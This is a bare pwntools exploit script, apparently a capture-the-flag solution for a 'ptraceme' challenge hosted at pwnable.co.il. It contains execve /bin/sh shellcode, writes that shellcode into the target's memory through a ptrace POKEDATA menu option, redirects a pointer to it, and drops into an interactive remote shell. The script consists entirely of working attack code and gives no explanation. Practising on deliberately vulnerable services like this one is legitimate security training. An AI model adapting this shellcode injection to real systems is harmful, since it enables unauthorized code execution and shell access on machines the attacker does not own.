from pwn import *
#b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
target_address = 4199176
data = [7075083857039864136, 
        6077441066081939049,
        1424526168255071]

PTRACE_POKEDATA = 5 # write
PTRACE_PEEKDATA = 2 # read
PTRACE_GETREGS = 12 # get registers

regs = 0x00007fffffffd4d0

binsh = 0x177b75
system = 0x41b80

#p = process("./ptraceme")
p = remote("pwnable.co.il", 9014)
addr = target_address
for i in range(3):
    p.sendline("1")
    p.sendline(str(PTRACE_POKEDATA)) 
    p.sendline(str(addr))
    p.sendline(str(data[i]))
    addr += 8

p.sendline("1")
p.sendline(str(PTRACE_POKEDATA))
p.sendline("4210776")
p.sendline(str(target_address))

p.sendline("2")
p.sendline("2")
p.interactive()

